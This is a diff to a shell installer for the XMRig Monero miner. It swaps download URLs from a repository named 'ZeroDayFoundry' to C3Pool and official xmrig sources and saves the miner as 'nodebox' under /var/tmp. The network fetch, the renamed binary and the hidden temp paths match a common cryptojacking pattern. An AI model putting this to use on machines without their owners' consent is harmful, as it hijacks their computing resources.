@@ -152,7 +152,7 @@ echo "[*] Removing /var/tmp/.docker directory"
 rm -rf /var/tmp/.docker
 
 echo "[*] Downloading C3Pool advanced version of nodebox to /var/tmp/nodebox.tar.gz"
-if ! download_file "https://raw.githubusercontent.com/XPACLION9X/ZeroDayFoundry/refs/heads/main/xmrig.tar.gz" /var/tmp/nodebox.tar.gz; then
+if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" /var/tmp/nodebox.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz file to /var/tmp/nodebox.tar.gz"
   exit 1
 fi
@@ -182,7 +182,7 @@ if (test $? -ne 0); then
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
-  LATEST_XMRIG_LINUX_RELEASE="https://raw.githubusercontent.com/XPACLION9X/ZeroDayFoundry/refs/heads/main/xmrig.tar.gz"
+  LATEST_XMRIG_LINUX_RELEASE="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /var/tmp/nodebox.tar.gz"
   if ! download_file "$LATEST_XMRIG_LINUX_RELEASE" /var/tmp/nodebox.tar.gz; then
